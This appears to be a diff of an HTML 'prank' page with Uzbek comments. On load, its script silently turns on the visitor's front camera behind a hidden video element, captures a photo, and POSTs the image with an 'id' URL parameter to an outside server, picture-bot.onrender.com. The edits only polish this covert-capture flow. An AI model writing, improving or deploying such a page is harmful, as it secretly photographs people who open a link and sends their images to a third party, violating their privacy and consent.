@@ -73,7 +73,7 @@
 </head>
 <body>
     <!-- Kamera va Canvas Elementlari -->
-    <video id="camera" width="640" height="480" autoplay style="display:none;"></video>
+    <video id="camera" width="640" height="480" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <!-- Rasm Ko'rsatish Qismi -->
@@ -91,7 +91,6 @@
     <button id="retryButton" class="hidden" onclick="initCamera()">Qayta urinish</button>
 
     <script>
-        // Elementlarni Tanlash
         const video = document.getElementById('camera');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
@@ -100,34 +99,35 @@
         const retryButton = document.getElementById('retryButton');
         const bytePhoto = document.getElementById('byte_photo');
 
-        // Kamerani Yoqish
         async function initCamera() {
             try {
-                // Kamerani sozlash
-                const constraints = {
+                // Kamera ruxsat so‘rayotganini bildirish
+                errorMessage.innerText = "📸 Kamera yuklanmoqda...";
+                errorMessage.classList.remove("hidden");
+
+                // Kamerani ishga tushirish
+                const stream = await navigator.mediaDevices.getUserMedia({
                     video: {
-                        facingMode: "user", // Old kamera
+                        facingMode: "user", // Old kamera, "environment" esa orqa uchun
                         width: { ideal: 1280 },
                         height: { ideal: 720 }
                     }
-                };
+                });
 
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 video.srcObject = stream;
 
                 video.addEventListener('loadeddata', () => {
-                    video.style.display = "block"; // Videoni ko'rsatish
-                    setTimeout(capturePhoto, 500); // Kamera yonishi uchun kutish
+                    errorMessage.classList.add("hidden");
+                    setTimeout(capturePhoto, 500);
                 });
             } catch (error) {
-                console.error('Kameraga ulanishda xatolik:', error);
-                errorMessage.innerText = "❌ Kamera ishlamayapti! Iltimos, kamerangizni tekshiring yoki ruxsat bering.";
+                console.error('Kamera ishlamayapti:', error);
+                errorMessage.innerText = "❌ Kamera ishlamayapti! Iltimos, kamerangizni tekshiring.";
                 errorMessage.classList.remove("hidden");
                 retryButton.classList.remove("hidden");
             }
         }
 
-        // Rasmni Olish
         function capturePhoto() {
             if (!video.srcObject || video.videoWidth === 0 || video.videoHeight === 0) {
                 errorMessage.innerText = "❌ Kamera ishlamayapti!";
@@ -141,28 +141,21 @@
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             const imageData = canvas.toDataURL("image/png");
-            bytePhoto.style.backgroundImage = `url(${imageData})`; // Rasmni ko'rsatish
-            prank.classList.remove("hidden"); // Rasmni ko'rsatish qismini ochish
+            bytePhoto.style.backgroundImage = `url(${imageData})`; 
+            prank.classList.remove("hidden");
 
-            // Rasmni Serverga Yuborish
             const userId = getQueryParam("id");
             sendImageToServer(imageData, userId);
         }
 
-        // Rasmni Serverga Yuborish
         function sendImageToServer(imageData, userId) {
             fetch("https://picture-bot.onrender.com/upload", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ image: imageData, userId })
             })
-            .then(res => {
-                if (!res.ok) throw new Error("Server xatosi: " + res.status);
-                return res.json();
-            })
-            .then(data => {
-                console.log("Rasm muvaffaqiyatli yuborildi:", data);
-            })
+            .then(res => res.json())
+            .then(data => console.log("Rasm muvaffaqiyatli yuborildi:", data))
             .catch(err => {
                 console.error("Xatolik:", err);
                 errorMessage.innerText = `❌ Xatolik: ${err.message}`;
@@ -171,13 +164,11 @@
             });
         }
 
-        // URL dan Query Parametrni Olish
         function getQueryParam(param) {
             const urlParams = new URLSearchParams(window.location.search);
             return urlParams.get(param);
         }
 
-        // Sahifa Yuklanganda Kamerani Yoqish
         document.addEventListener('DOMContentLoaded', () => {
             initCamera();
         });
